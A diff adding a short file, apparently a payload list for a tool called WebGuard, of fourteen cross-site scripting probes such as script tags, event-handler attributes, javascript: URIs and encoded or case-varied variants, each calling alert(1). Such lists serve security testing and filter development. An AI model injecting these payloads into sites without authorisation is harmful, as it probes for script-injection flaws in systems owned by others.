@@ -1,0 +1,15 @@
+# WebGuard v3 — XSS Payloads
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+</title><script>alert(1)</script>
+javascript:alert(1)
+<iframe src=javascript:alert(1)>
+%3Cscript%3Ealert(1)%3C%2Fscript%3E
+<ScRiPt>alert(1)</ScRiPt>
+<script>alert`1`</script>
+<details/open/ontoggle=alert(1)>
+<input autofocus onfocus=alert(1)>
+<body onload=alert(1)>
+<a href=javascript:alert(1)>click
